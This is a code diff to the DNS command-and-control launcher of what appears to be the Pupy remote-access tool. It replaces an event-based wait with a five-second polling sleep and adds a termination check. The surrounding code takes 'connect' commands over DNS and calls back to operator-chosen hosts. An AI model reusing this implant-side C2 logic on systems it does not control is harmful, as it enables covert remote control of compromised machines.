@@ -17,7 +17,9 @@ from ..clients import PupyProxifiedTCPClient, PupyProxifiedSSLClient
 from ..online import PortQuiz, check
 from ..scan import scan
 
-from threading import Thread, Event, Lock
+from threading import Thread, Lock
+
+from time import sleep
 
 import socket
 import os
@@ -45,7 +47,6 @@ class DNSCommandClientLauncher(DnsCommandsClient):
         self.stream = None
         self.commands = []
         self.lock = Lock()
-        self.new_commands = Event()
 
         try:
             import pupy_credentials
@@ -179,7 +180,6 @@ class DNSCommandClientLauncher(DnsCommandsClient):
                 return
 
             self.commands.append(('connect', ip, port, transport, proxy))
-            self.new_commands.set()
 
     def on_disconnect(self):
         logger.debug('disconnect request [stream=%s]', self.stream)
@@ -363,10 +363,12 @@ class DNSCncLauncher(BaseLauncher):
             yield stream
 
     def iterate(self):
+        import sys
+
         if not self.dnscnc:
             self.activate()
 
-        while not self.exited:
+        while not self.exited and not sys.terminated:
             try:
                 connection = self.process()
                 if not connection:
@@ -394,22 +396,21 @@ class DNSCncLauncher(BaseLauncher):
 
     def process(self):
         command = None
-        wait = False
         connection = None
+        wait = False
 
         with self.dnscnc.lock:
             if self.dnscnc.commands:
                 command = self.dnscnc.commands.pop()
-            else:
-                self.dnscnc.new_commands.clear()
 
             if not command:
                 wait = True
+
             elif command[0] == 'connect':
                 connection = self.on_connect(command)
 
         if wait:
-            self.dnscnc.new_commands.wait()
+            sleep(5)
 
         return connection
 
